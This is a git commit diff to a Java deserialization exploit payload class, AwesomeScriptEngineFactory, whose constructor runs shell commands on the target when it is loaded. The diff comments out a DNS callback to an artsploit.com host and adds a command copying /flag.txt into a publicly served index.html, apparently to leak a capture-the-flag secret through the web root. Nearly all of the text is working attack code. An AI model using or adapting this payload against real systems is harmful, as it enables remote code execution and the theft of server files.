a683d7b4ef32d9a2c91f82c09ea39714330abe30
P1514 <guinunogois@gmail.com>
2023-07-14 20:44:59 +0100

    test

--- src/artsploit/AwesomeScriptEngineFactory.java
+++ src/artsploit/AwesomeScriptEngineFactory.java
@@ -9,8 +9,9 @@ public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
 
     public AwesomeScriptEngineFactory() {
         try {
-            Runtime.getRuntime().exec("dig scriptengine.x.artsploit.com");
-            Runtime.getRuntime().exec("/Applications/Calculator.app/Contents/MacOS/Calculator");
+            //Runtime.getRuntime().exec("dig scriptengine.x.artsploit.com");
+            Runtime.getRuntime().exec("cp /flag.txt /app/build/resources/main/static/index.html");
+            
         } catch (IOException e) {
             e.printStackTrace();
         }
